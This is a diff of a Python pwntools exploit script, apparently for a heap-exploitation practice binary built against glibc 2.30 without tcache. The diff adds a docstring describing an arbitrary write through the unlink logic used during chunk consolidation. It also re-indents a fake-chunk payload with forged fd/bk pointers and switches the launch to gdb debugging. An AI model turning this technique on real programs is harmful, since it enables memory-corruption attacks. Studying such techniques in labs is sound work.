@@ -23,7 +23,7 @@ def edit(p, index, data):
     p.sendline(data)
 
 def safe_unlink(p):
-    ''''''
+    '''arbitrary write using unlink logic that occurs as a part of consolidation'''
     libc = ELF('../.glibc/glibc_2.30_no-tcache/libc.so.6')
 
     m_array = 0x602060
@@ -43,13 +43,13 @@ def safe_unlink(p):
 
     #overwrite m_array index 0 with it's own addr
     edit(p, b'0', 
-         p64(0)      + 
-         p64(0xc1)   +
-         fd_addr     + 
-         bk_addr     +
-         p64(0) * 20 +
-         p64(0xc0)   +
-         p64(0xd0)   
+            p64(0)      + 
+            p64(0xc1)   +
+            fd_addr     + 
+            bk_addr     +
+            p64(0) * 20 +
+            p64(0xc0)   +
+            p64(0xd0)   
     )
 
     free(p, b'1')
@@ -69,10 +69,10 @@ def safe_unlink(p):
 
     free(p, b'0')
 
-p = process('./safe_unlink')
-#p = gdb.debug('./safe_unlink', '''
-#c
-#''')
+#p = process('./safe_unlink')
+p = gdb.debug('./safe_unlink', '''
+c
+''')
 
 safe_unlink(p)
 
